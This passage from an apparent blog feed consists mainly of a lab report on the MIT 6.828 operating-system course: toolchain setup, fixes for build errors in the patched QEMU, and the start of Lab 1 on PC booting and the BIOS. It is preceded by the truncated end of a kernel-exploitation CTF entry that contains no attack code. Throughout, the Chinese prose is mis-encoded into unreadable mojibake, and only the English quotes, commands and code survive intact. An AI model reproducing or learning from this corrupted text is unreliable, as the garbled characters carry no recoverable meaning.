çš„éš”ç¦»ï¼‰ï¼Œä½†ç¬”è€…å°šæœªå‘ç° 5.14 å†…æ ¸ä¸­ slub æ¶‰åŠçš„æºç çš„ç›¸å…³æ”¹åŠ¨ï¼ˆç¬”è€…ä»…ç²—ç•¥æ£€ç´¢äº†æºç ï¼‰</li></ul>]]></content>
    
    
    <summary type="html">&lt;p&gt;å¬è¯´ sb å‡ºé¢˜äººæŠŠ exp ä¹Ÿç»™æ‰“åŒ…å‘å¸ƒäº†ï¼Œæ¯”èµ›ç»“æŸæ‰å‘ç°&lt;/p&gt;</summary>
    
    
    
    <category term="CTF" scheme="http://blog.arttnba3.cn/categories/CTF/"/>
    
    
    <category term="Pwn" scheme="http://blog.arttnba3.cn/tags/Pwn/"/>
    
    <category term="ä¿¡æ¯å®‰å…¨" scheme="http://blog.arttnba3.cn/tags/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8/"/>
    
    <category term="CTF" scheme="http://blog.arttnba3.cn/tags/CTF/"/>
    
    <category term="Use After Free" scheme="http://blog.arttnba3.cn/tags/Use-After-Free/"/>
    
    <category term="Linux" scheme="http://blog.arttnba3.cn/tags/Linux/"/>
    
    <category term="Linux Kernel" scheme="http://blog.arttnba3.cn/tags/Linux-Kernel/"/>
    
    <category term="Kernel UAF" scheme="http://blog.arttnba3.cn/tags/Kernel-UAF/"/>
    
    <category term="D^3CTF" scheme="http://blog.arttnba3.cn/tags/D-3CTF/"/>
    
  </entry>
  
  <entry>
    <title>ã€EXPR.0x00ã€‘MIT 6.828 è¯¾ç¨‹å®éªŒæŠ¥å‘Š</title>
    <link href="http://blog.arttnba3.cn/2022/02/21/EXPR-0X00-MIT_6_828/"/>
    <id>http://blog.arttnba3.cn/2022/02/21/EXPR-0X00-MIT_6_828/</id>
    <published>2022-02-20T18:57:25.000Z</published>
    <updated>2022-07-03T19:11:02.366Z</updated>
    
    <content type="html"><![CDATA[<p>ä¸å¦‚ Windows XP å¥½ç”¨</p><span id="more"></span><h1 id="0x00-ä¸€åˆ‡å¼€å§‹ä¹‹å‰"><a href="#0x00-ä¸€åˆ‡å¼€å§‹ä¹‹å‰" class="headerlink" title="0x00.ä¸€åˆ‡å¼€å§‹ä¹‹å‰"></a>0x00.ä¸€åˆ‡å¼€å§‹ä¹‹å‰</h1><blockquote><p>ä¸ºä»€ä¹ˆè¦å†™è¿™ç¯‡åšå®¢ï¼Ÿå‚è§ <a href="https://arttnba3.cn/2022/03/18/PIECES-0X03-SHELL_OUTSIDE-3-IDEALIST_DEATH/">https://arttnba3.cn/2022/03/18/PIECES-0X03-SHELL_OUTSIDE-3-IDEALIST_DEATH&#x2F;</a></p></blockquote><p>MIT 6.828 æ˜¯ååˆ†è‘—åçš„ä¸€ä¸ªç»¼åˆæ€§çš„æ“ä½œç³»ç»Ÿå®éªŒè¯¾ç¨‹ï¼Œç”±éº»çœç†å·¥å¤§å­¦ï¼ˆMITï¼‰å¼€è®¾ï¼Œä¸€å…±æœ‰ 6 ä¸ª labï¼ŒåŸºäº XV6â€”â€”ä¸€ä¸ªä¸ºOSè¯¾ç¨‹æ•™å­¦è€Œå¼€å‘çš„ OS kernelï¼Œæ‰‹æŠŠæ‰‹å¸¦ä½ ä¸€æ­¥æ­¥è¡¥å…¨ä¸€ä¸ªæ“ä½œç³»ç»Ÿå†…æ ¸ã€‚ç¬”è€…è®¤ä¸ºè¿™æ˜¯ååˆ†ä¼˜ç§€ä¸”å¯Œæœ‰å®Œæˆä»·å€¼çš„ä¸€ä¸ª OS å®éªŒï¼Œå› æ­¤ç¬”è€…å†³å®šè¶å¤§ä¸‰å¯’å‡å®ä¹ çš„ç©ºé—²æ—¶é—´å°†æœ¬è¯¾ç¨‹è¡¥å®Œã€‚</p><p>ç¬”è€…é€‰ç”¨å…¶ 2018 å¹´çš„å®éªŒè¯¾ç¨‹ï¼Œå› ä¸ºè‡ªä» 2019 èµ·ä»–ä»¬è½¬å‘äº† RISC-Vï¼Œè€Œç¬”è€…æš‚æ—¶ä¸æƒ³ç¦»å¼€ X86 çš„èˆ’é€‚åŒºï¼ˆç¬‘ï¼‰ï¼Œå› ä¸ºæœ¬æ¬¡å®éªŒçš„ä¸»è¦ç›®çš„è¿˜æ˜¯å­¦ä¹ æ“ä½œç³»ç»Ÿï¼Œç¬”è€…ä¸æƒ³åœ¨å­¦ä¹ å…¶ä»–æ¶æ„ä¸ŠèŠ±è´¹å¤ªå¤šæ—¶é—´</p><h2 id="PRE-ç¯å¢ƒæ­å»º"><a href="#PRE-ç¯å¢ƒæ­å»º" class="headerlink" title="PRE.ç¯å¢ƒæ­å»º"></a>PRE.ç¯å¢ƒæ­å»º</h2><blockquote><p>å‚è§ <a href="https://pdos.csail.mit.edu/6.828/2018/tools.html">https://pdos.csail.mit.edu/6.828/2018/tools.html</a></p><h1 id="Tools-Used-in-6-828"><a href="#Tools-Used-in-6-828" class="headerlink" title="Tools Used in 6.828"></a>Tools Used in 6.828</h1><p>Youâ€™ll use two sets of tools in this class: an x86 emulator, <a href="https://pdos.csail.mit.edu/6.828/2018/tools.html#qemu">QEMU</a>, for running your kernel; and a <a href="https://pdos.csail.mit.edu/6.828/2018/tools.html#chain">compiler toolchain</a>, including assembler, linker, C compiler, and debugger, for compiling and testing your kernel. This page has the information youâ€™ll need to download and install your own copies. This class assumes familiarity with Unix commands throughout.</p><p>We highly recommend using a Debathena machine, such as athena.dialup.mit.edu, to work on the labs. If you use the MIT Athena machines that run Linux, then all the software tools you will need for this course are located in the 6.828 locker: just type â€˜add -f 6.828â€™ to get access to them.</p><p>If you donâ€™t have access to a Debathena machine, we recommend you use a virtual machine with Linux. If you really want to, you can build and install the tools on your own machine. We have instructions below for Linux and MacOS computers.</p><p>It should be possible to get this development environment running under windows with the help of <a href="http://www.cygwin.com/">Cygwin</a>. Install cygwin, and be sure to install theÂ flexÂ andÂ bisonÂ packages (they are under the development header).</p><p>For an overview of useful commands in the tools used in 6.828, see the <a href="https://pdos.csail.mit.edu/6.828/2018/labguide.html">lab tools guide</a>.</p></blockquote><p>ä¸ºäº†å¼€å§‹æœ¬æ¬¡å®éªŒï¼Œæˆ‘ä»¬ä¸»è¦éœ€è¦è¿™ä¸¤æ ·ä¸œè¥¿ï¼š</p><ul><li><p>ä¸€ä¸ª x86 æ¨¡æ‹Ÿå™¨ï¼šQEMUâ€”â€”ç”¨ä»¥è¿è¡Œå†…æ ¸</p></li><li><p>ä¸€å¥—ç¼–è¯‘å·¥å…·ï¼ŒåŒ…æ‹¬æ±‡ç¼–å™¨ã€é“¾æ¥å™¨ã€C ç¼–è¯‘å™¨ã€è°ƒè¯•å™¨â€”â€”ç”¨ä»¥ç¼–è¯‘ä¸æµ‹è¯•å†…æ ¸</p></li></ul><h3 id="Compiler-Toolchain"><a href="#Compiler-Toolchain" class="headerlink" title="Compiler Toolchain"></a>Compiler Toolchain</h3><p>ä¸ºäº†å®Œæˆæœ¬æ¬¡å®éªŒï¼Œç¬”è€…ç”¨äº†ä¸€ä¸ªè¿‘ä¹å…¨æ–°çš„ Ubuntu 21.10ï¼ŒæŒ‰è¯¾ç¨‹é¡µé¢è¿›è¡Œå¦‚ä¸‹æ“ä½œï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">sudo apt-get install -y build-essential gdb</span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">sudo apt-get install gcc-multilib</span></span><br></pre></td></tr></table></figure><p>æ£€æŸ¥ï¼Œå‡ºç°ç±»ä¼¼ä¸‹é¢çš„è¾“å‡ºè¯´æ˜å®‰è£…æˆåŠŸ</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">gcc -m32 -print-libgcc-file-name</span></span><br><span class="line">/usr/lib/gcc/x86_64-linux-gnu/8/32/libgcc.a</span><br></pre></td></tr></table></figure><h3 id="QEMU-Emulator"><a href="#QEMU-Emulator" class="headerlink" title="QEMU Emulator"></a>QEMU Emulator</h3><p>ä¸ºäº†æ›´å¥½åœ°è¿›è¡Œå®éªŒï¼ŒMIT 6.828 è¯¾ç¨‹çš„æ•™å¸ˆä»¬å°† qemu è¿›è¡Œäº†ä¸€å®šçš„æ”¹é€ ï¼Œå› æ­¤æˆ‘ä»¬éœ€è¦æ‰‹åŠ¨ç¼–è¯‘å®‰è£… patch åçš„ QEMU</p><p>é¦–å…ˆè¡¥å……å®‰è£…ä¸€äº›åº“ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">sudo apt install libsdl1.2-dev libtool-bin libglib2.0-dev libz-dev libpixman-1-dev</span></span><br></pre></td></tr></table></figure><p>ä» GitHub æ‹‰æºç ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">git <span class="built_in">clone</span> https://github.com/mit-pdos/6.828-qemu.git qemu</span></span><br></pre></td></tr></table></figure><p>åœ¨æºç ç›®å½•ä¸‹è¿›è¡Œéœ€è¦çš„é…ç½®ï¼Œ<code>[]</code> é‡Œçš„æ˜¯å¯é€‰é¡¹ï¼ˆè¾“å…¥å‘½ä»¤æ—¶ä¸å¸¦è¿™ä¸ªæ¡†ï¼‰</p><ul><li><p><code>--prefix=PFX</code>ï¼šæŒ‡å®šå®‰è£… qemu çš„ç›®å½•ï¼Œè‹¥æœªæŒ‡å®šåˆ™é»˜è®¤ä¸º <code>/usr/local</code></p></li><li><p><code>--target-list=&quot;i386-softmmu x86_64-softmmu</code>ï¼šç²¾ç®€åŒ–è¦å®‰è£…çš„æ¶æ„</p></li></ul><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">./configure --disable-kvm --disable-werror [--prefix=PFX] [--target-list=<span class="string">&quot;i386-softmmu x86_64-softmmu&quot;</span>]</span></span><br></pre></td></tr></table></figure><p>æœ€åç¼–è¯‘å°±å®Œäº‹äº†</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">make</span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">sudo make install</span></span><br></pre></td></tr></table></figure><blockquote><h3 id="å¯èƒ½å‡ºç°çš„é”™è¯¯"><a href="#å¯èƒ½å‡ºç°çš„é”™è¯¯" class="headerlink" title="å¯èƒ½å‡ºç°çš„é”™è¯¯"></a>å¯èƒ½å‡ºç°çš„é”™è¯¯</h3><p>ç¬”è€…åœ¨ç¼–è¯‘ qemu æ—¶é‡åˆ°äº†è¿™æ ·çš„é”™è¯¯ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">...</span><br><span class="line">  CC    stubs/qmp_pc_dimm_device_list.o</span><br><span class="line">  AR    libqemustub.a</span><br><span class="line">  LINK  qemu-ga</span><br><span class="line">/usr/bin/ld: qga/commands-posix.o: in function `dev_major_minor&#x27;:</span><br><span class="line">/home/arttnba3/Desktop/MIT_6.828/qqemu/qga/commands-posix.c:633: undefined reference to `major&#x27;</span><br><span class="line">/usr/bin/ld: /home/arttnba3/Desktop/MIT_6.828/qqemu/qga/commands-posix.c:634: undefined reference to `minor&#x27;</span><br><span class="line">collect2: error: ld returned 1 exit status</span><br><span class="line">make: *** [Makefile:288: qemu-ga] Error 1</span><br></pre></td></tr></table></figure><p>å‚ç…§ <a href="http://patchwork.ozlabs.org/patch/709415/">[v3] build: include sys&#x2F;sysmacros.h for major() and minor() - Patchwork</a> ï¼Œåœ¨ qemu æºç ç›®å½•ä¸‹çš„ <code>qga/commands-posix.c</code> åŠ ä¸Šä¸€ä¸ª <code>#include &lt;sys/sysmacros.h&gt;</code></p><p>ç»§ç»­ make installï¼Œä¹‹åè¿˜å¯èƒ½å‡ºç°è¿™æ ·ä¸€ä¸ªé”™è¯¯ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">...</span><br><span class="line">  Building optionrom/kvmvapic.img</span><br><span class="line">  Building optionrom/kvmvapic.raw</span><br><span class="line">  Signing optionrom/kvmvapic.bin</span><br><span class="line">install -d -m 0755 &quot;/usr/local/share/qemu&quot;</span><br><span class="line">install: cannot change permissions of â€˜/usr/local/share/qemuâ€™: No such file or directory</span><br><span class="line">make: *** [Makefile:382: install-datadir] Error 1</span><br></pre></td></tr></table></figure><p>æˆ‘ä»¬æ‰‹åŠ¨åˆ›å»º <code>/usr/local/share/qemu</code> è¿™ä¸ªç›®å½•å³å¯</p><p>ä¹‹åç»§ç»­ make installï¼ŒåˆæŠ¥ç¼ºä¸€ä¸ªç›®å½•çš„é”™è¯¯ï¼ˆä¸èƒ½ä¸€æ¬¡æŠ¥å®Œå˜› - - ï¼‰</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">install -d -m 0755 &quot;/usr/local/share/qemu&quot;</span><br><span class="line">install -d -m 0755 &quot;/usr/local/etc/qemu&quot;</span><br><span class="line">install: cannot change permissions of â€˜/usr/local/etc/qemuâ€™: No such file or directory</span><br><span class="line">make: *** [Makefile:392: install-confdir] Error 1</span><br></pre></td></tr></table></figure><p>ä¾æ—§æ‰‹åŠ¨åˆ›å»ºä¹‹ï¼Œç„¶å make installï¼Œè¿™é‡Œéœ€è¦æ³¨æ„æˆ‘ä»¬åº”å½“ä»¥ root æƒé™æ‰§è¡Œ</p></blockquote><h1 id="0x01-Lab-1-Booting-a-PC"><a href="#0x01-Lab-1-Booting-a-PC" class="headerlink" title="0x01.Lab 1: Booting a PC"></a>0x01.Lab 1: Booting a PC</h1><blockquote><p>lab é¡µé¢ï¼š <a href="https://pdos.csail.mit.edu/6.828/2018/labs/lab1/%5D">[https://pdos.csail.mit.edu/6.828/2018/labs/lab1/]</a>(<a href="https://pdos.csail.mit.edu/6.828/2018/labs/lab1/">Lab 1: PC Bootstrap and GCC Calling Conventions</a>)</p></blockquote><blockquote><p>è¯¥ lab å¤§é‡å†…å®¹ä¸ <a href="https://arttnba3.cn/2021/06/24/CODE-0X00-A3OS/">ã€CODE.0x00ã€‘ä»é›¶å¼€å§‹çš„32ä½æ“ä½œç³»ç»Ÿå¼€å‘æ‰‹è®° - arttnba3â€™s blog</a>é‡å¤ï¼Œ<strong>ç›¸å…³çŸ¥è¯†ç¬”è€…äºæœ¬ç¯‡åšå®¢ä¸­ä»…åšç®€è¿°ï¼Œä¸å†é‡å¤æ‘˜æŠ„ï¼Œå¦‚æœ‰éœ€è¦è¯·è‡ªè¡Œé˜…è¯»ç¬”è€…çš„è¿™ç¯‡åšå®¢</strong></p></blockquote><p>è¯¥ lab æ€»å…±ä¸‰ä¸ªéƒ¨åˆ†ï¼š</p><ul><li><p>ç†Ÿæ‚‰ x86 æ±‡ç¼–è¯­è¨€ã€QEMU x86 æ¨¡æ‹Ÿå™¨ã€PCçš„å¼€æœºå¼•å¯¼æµç¨‹</p></li><li><p>æµ‹è¯•æˆ‘ä»¬ç”¨äºå¼•å¯¼å†…æ ¸çš„ boot loaderï¼ˆxv6æºç ä¸‹ <code>boot</code> ç›®å½•ï¼‰</p></li><li><p>æ·±å…¥ç ”ç©¶ 6.828 å†…æ ¸çš„åˆå§‹æ¨¡æ¿ï¼ˆJOSï¼‰</p></li></ul><p>åœ¨å¼€å§‹å®éªŒä¹‹å‰æˆ‘ä»¬é¦–å…ˆæŠŠ xv6 æºç æ‹‰åˆ°æœ¬åœ°ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">git <span class="built_in">clone</span> https://pdos.csail.mit.edu/6.828/2018/jos.git lab</span></span><br></pre></td></tr></table></figure><p>å¯¹äº MIT çš„å­¦ç”Ÿæ¥è¯´éœ€è¦å°†å®éªŒè¿‡ç¨‹ <code>make handin</code> ä¹‹åæäº¤åˆ°å¯¹åº”çš„ä»“åº“ï¼Œä¸è¿‡ç¬”è€…åªæ˜¯å¤§æ´‹å½¼å²¸æ—å¬çš„ï¼ˆç¬‘ï¼‰æ‰€ä»¥è¿™ä¸€æ­¥å°±è·³è¿‡äº†</p><h2 id="Part-1-PC-Bootstrap"><a href="#Part-1-PC-Bootstrap" class="headerlink" title="Part 1: PC Bootstrap"></a>Part 1: PC Bootstrap</h2><p>è¿™ä¸€éƒ¨åˆ†çš„ä¸»è¦ç›®çš„æ˜¯è®©å­¦ç”Ÿç†Ÿæ‚‰<strong>ä¸€ä¸ªè®¡ç®—æœºæ˜¯å¦‚ä½•å¯åŠ¨çš„</strong>ï¼Œé€šç”µâ€”â€”è½½å…¥ BIOSâ€”â€”BIOSè½½å…¥ MBRâ€”â€”è·³è½¬åˆ° MBRâ€”â€”ï¼ˆè½½å…¥ loaderï¼‰â€”â€”è½½å…¥å†…æ ¸</p><blockquote><p>å‚è§ç¬”è€…çš„<a href="https://arttnba3.cn/2021/06/24/CODE-0X00-A3OS/">è¿™ç¯‡åšå®¢</a></p></blockquote><h3 id="Getting-Started-with-x86-assembly"><a href="#Getting-Started-with-x86-assembly" class="headerlink" title="Getting Started with x86 assembly"></a>Getting Started with x86 assembly</h3><p>MIT ä¸ºé‚£äº›ä¸ç†Ÿæ‚‰ x86 æ±‡ç¼–è¯­è¨€çš„äººå‡†å¤‡äº† <a href="https://pdos.csail.mit.edu/6.828/2018/readings/pcasm-book.pdf">PC Assembly Language Book</a>ï¼Œæ¥ä¸‹æ¥æˆ‘ä»¬æ¥çœ‹ Exercise1ï¼š</p><blockquote><p>Exercise 1.Â Familiarize yourself with the assembly language materials available on <a href="https://pdos.csail.mit.edu/6.828/2018/reference.html">the 6.828 reference page</a>. You donâ€™t have to read them now, but youâ€™ll almost certainly want to refer to some of this material when reading and writing x86 assembly.</p><p>We do recommend reading the section â€œThe Syntaxâ€ in <a href="http://www.delorie.com/djgpp/doc/brennan/brennan_att_inline_djgpp.html">Brennanâ€™s Guide to Inline Assembly</a>. It gives a good (and quite brief) description of the AT&amp;T assembly syntax weâ€™ll be using with the GNU assembler in JOS.</p></blockquote><p>è¿™ä¸€éƒ¨åˆ†ä¸»è¦å°±æ˜¯ç†Ÿæ‚‰ x86 æ±‡ç¼–è¯­è¨€ï¼Œç¬”è€…åœ¨é«˜ä¸­çš„æ—¶å€™å°±å·²ç»ä¼šäº†æ•…è¿™é‡Œç›´æ¥è·³è¿‡ï¼ˆç¬‘ï¼‰ï¼Œä¸è¿‡å…¶æ¨èçš„ææ–™è¿˜æ˜¯å€¼å¾—ä¸€è¯»çš„ã€‚</p><p>æ¯”è¾ƒä»¤ç¬”è€…ä¸é€‚çš„æ˜¯å®éªŒä¸­æ¶‰åŠåˆ°çš„æ±‡ç¼–ä»£ç éƒ½æ˜¯ä¸‘é™‹çš„ AT&amp;T è¯­æ³•è€Œå¹¶éä¼˜ç¾çš„ x86 è¯­æ³•ï¼ˆæ¼ï¼‰</p><h3 id="Simulating-the-x86"><a href="#Simulating-the-x86" class="headerlink" title="Simulating the x86"></a>Simulating the x86</h3><p>è¿™ä¸€æ­¥æˆ‘ä»¬å¼€å§‹ç¼–è¯‘ JOSï¼ˆxv6ï¼‰å¹¶å°è¯•ä½¿ç”¨ qemu è¿è¡Œï¼Œåœ¨åˆšåˆš clone ä¸‹æ¥çš„æºç ç›®å½•ä¸‹è¿›è¡Œï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">make</span></span><br><span class="line">+ as kern/entry.S</span><br><span class="line">+ cc kern/entrypgdir.c</span><br><span class="line">+ cc kern/init.c</span><br><span class="line">+ cc kern/console.c</span><br><span class="line">+ cc kern/monitor.c</span><br><span class="line">+ cc kern/printf.c</span><br><span class="line">+ cc kern/kdebug.c</span><br><span class="line">+ cc lib/printfmt.c</span><br><span class="line">+ cc lib/readline.c</span><br><span class="line">+ cc lib/string.c</span><br><span class="line">+ ld obj/kern/kernel</span><br><span class="line">ld: warning: section `.bss&#x27; type changed to PROGBITS</span><br><span class="line">+ as boot/boot.S</span><br><span class="line">+ cc -Os boot/main.c</span><br><span class="line">+ ld boot/boot</span><br><span class="line">boot block is 412 bytes (max 510)</span><br><span class="line">+ mk obj/kern/kernel.img</span><br></pre></td></tr></table></figure><p>å…¶ä¼šç”Ÿæˆä¸€ä¸ªç£ç›˜é•œåƒæ–‡ä»¶</p><p>æ¥ä¸‹æ¥å¯åŠ¨ qemuï¼ŒMIT åœ¨å…¶æä¾›çš„ Makefile æ–‡ä»¶ä¸­å†™å¥½äº†å¯åŠ¨çš„ä»£ç ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">make qemu</span></span><br></pre></td></tr></table></figure><p>å¯åŠ¨ç•Œé¢å¦‚ä¸‹ï¼Œè¿™ä¸¤ä¸ªç•Œé¢éƒ½å¯ä»¥è¿›è¡Œè¾“å…¥ï¼Œè¿˜æ˜¯ååˆ†æ–¹ä¾¿çš„ï¼š</p><p><img src="https://s2.loli.net/2022/02/20/FCqAQm85o3OUzKH.png" alt="imagepng"></p><p>åœ¨æœ€åˆæ—¶ JOS åªæä¾›äº†ä¸¤ä¸ªå‘½ä»¤ï¼š<code>help</code> å’Œ <code>kerninfo</code>ï¼Œ<strong>è¡¥å®Œå‰©ä¸‹çš„åŠŸèƒ½è®©å…¶æˆä¸ºä¸€ä¸ªå®Œæ•´çš„å†…æ ¸ä¾¿æ˜¯æˆ‘ä»¬åœ¨åé¢å‡ ä¸ª lab ä¸­è¦åšçš„äº‹æƒ…</strong> <img src="https://s2.loli.net/2022/02/20/RmXtkdYnL7HGCK5.png" alt="imagepng"></p><h3 id="The-PCâ€™s-Physical-Address-Space"><a href="#The-PCâ€™s-Physical-Address-Space" class="headerlink" title="The PCâ€™s Physical Address Space"></a>The PCâ€™s Physical Address Space</h3><p>ä¸€å° PC çš„ç‰©ç†åœ°å€é€šå¸¸éµå¾ªå¦‚ä¸‹å¸ƒå±€ï¼ˆ32ä½ä¸‹ï¼‰ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">+------------------+  &lt;- 0xFFFFFFFF (4GB)</span><br><span class="line">|      32-bit      |</span><br><span class="line">|  memory mapped   |</span><br><span class="line">|     devices      |</span><br><span class="line">|                  |</span><br><span class="line">/\/\/\/\/\/\/\/\/\/\</span><br><span class="line"></span><br><span class="line">/\/\/\/\/\/\/\/\/\/\</span><br><span class="line">|                  |</span><br><span class="line">|      Unused      |</span><br><span class="line">|                  |</span><br><span class="line">+------------------+  &lt;- depends on amount of RAM</span><br><span class="line">|                  |</span><br><span class="line">|                  |</span><br><span class="line">| Extended Memory  |</span><br><span class="line">|                  |</span><br><span class="line">|                  |</span><br><span class="line">+------------------+  &lt;- 0x00100000 (1MB)</span><br><span class="line">|     BIOS ROM     |</span><br><span class="line">+------------------+  &lt;- 0x000F0000 (960KB)</span><br><span class="line">|  16-bit devices, |</span><br><span class="line">|  expansion ROMs  |</span><br><span class="line">+------------------+  &lt;- 0x000C0000 (768KB)</span><br><span class="line">|   VGA Display    |</span><br><span class="line">+------------------+  &lt;- 0x000A0000 (640KB)</span><br><span class="line">|                  |</span><br><span class="line">|    Low Memory    |</span><br><span class="line">|                  |</span><br><span class="line">+------------------+  &lt;- 0x00000000</span><br></pre></td></tr></table></figure><blockquote><p>å…³äºå‰é¢è¿™ 1MB çš„å…·ä½“å†…å­˜å¸ƒå±€ï¼Œå¯ä»¥å‚è§ <a href="https://arttnba3.cn/2021/06/24/CODE-0X00-A3OS/#%E4%B8%80%E3%80%81%E5%AE%9E%E6%A8%A1%E5%BC%8F%E4%B8%8B%E7%9A%84%E5%86%85%E5%AD%98%E5%B8%83%E5%B1%80">ã€CODE.0x00ã€‘ä»é›¶å¼€å§‹çš„32ä½æ“ä½œç³»ç»Ÿå¼€å‘æ‰‹è®° - arttnba3â€™s blog</a></p></blockquote><h3 id="The-ROM-BIOS"><a href="#The-ROM-BIOS" class="headerlink" title="The ROM BIOS"></a>The ROM BIOS</h3><p>åœ¨è¿™éƒ¨åˆ†å®éªŒä¸­æˆ‘ä»¬å°†ä½¿ç”¨ gdb æ¥è°ƒè¯• qemuï¼ŒMIT åŒæ ·åœ¨ Makefile ä¸­ç¼–å†™å¥½äº†ç›¸åº”çš„å‘½ä»¤è¡Œï¼Œæˆ‘ä»¬åªéœ€è¦åœ¨ç¬¬ä¸€ä¸ªç»ˆç«¯ç•Œé¢ä¸­æ‰§è¡Œï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">make qemu-gdb</span></span><br></pre></td></tr></table></figure><p>å…¶ä¼šå¯åŠ¨ä¸€ä¸ªç­‰å¾… gdb è¿æ¥ çš„qemu</p><p><img src="https://s2.loli.net/2022/02/20/rdO63wCxPUovYsN.png" alt="imagepng"></p><p>æ¥ä¸‹æ¥åœ¨ç¬¬äºŒä¸ªç»ˆç«¯ä¸­æ‰§è¡Œï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">make gdb</span></span><br></pre></td></tr></table></figure><p>å…¶ä¼šå¯åŠ¨ gdb å¹¶è‡ªåŠ¨è¿æ¥ä¸Š qemuï¼Œè¿™é‡Œæˆ‘ä»¬å¯ä»¥çœ‹åˆ° <code>CS:IP</code> ä¸º <code>0xf000:0xfff0</code>ï¼Œå³æ­¤æ—¶æ‰§è¡Œçš„ä»£ç åœ°å€ä¸º <code>0xffff0</code> ï¼Œå…¶å®å°±æ˜¯ <strong>BIOS çš„å…¥å£ç‚¹</strong></p><p><img src="https://s2.loli.net/2022/03/15/G8adZYg3pk9lBRr.png" alt="image.png"></p><blockquote><p>ä¸ºäº†åŸæ±åŸå‘³æ¨¡æ‹Ÿ MIT å®éªŒçš„æ„Ÿè§‰ï¼Œç¬”è€…å¹¶æœªè£…ä¸Š pwn æ‰‹å¸¸ç”¨çš„ pwndbg æ’ä»¶ï¼ˆå…¶å®åªæ˜¯æ‡’ + æ€•å‡ºç°å¥‡æ€ªçš„é—®é¢˜ï¼‰</p></blockquote><p>MIT å¯¹è¿™ä¸ªå¯åŠ¨è¿‡ç¨‹æ€»ç»“å‡ºå¦‚ä¸‹ä¸‰ç‚¹ï¼š</p><ul><li><p>IBM PC å¯åŠ¨æ—¶æ‰§è¡Œ 0x000ffff0 å¤„ä»£ç ï¼Œè¿™æ˜¯ä¸º ROM BIOS ä¿ç•™çš„å†…å­˜åŒºåŸŸçš„é¡¶éƒ¨</p></li><li><p>PC å¯åŠ¨æ—¶ <code>CS = 0xf000</code>ï¼Œ<code>IP = 0xfff0</code></p></li><li><p>æ‰§è¡Œçš„ç¬¬ä¸€æ¡æŒ‡ä»¤ä¸ºè·³è½¬æŒ‡ä»¤ï¼Œè·³è½¬è‡³<code>CS = 0xf000, IP = 0xe05b</code> å¤„</p></li></ul><p>ä¸ºä»€ä¹ˆQEMU çš„å¯åŠ¨æµç¨‹æ˜¯è¿™æ ·çš„ï¼Ÿè¿™é¦–å…ˆæ˜¯ Intel è®¾è®¡ 8088 å¤„ç†å™¨çš„æ¨¡å¼ï¼Œä¹‹åè¢« IBM ç”¨åœ¨äº†æœ€åˆçš„ PC ä¸Šï¼Œè¿™æ˜¯å› ä¸ºåœ¨ PC ä¸Šï¼Œ BIOS 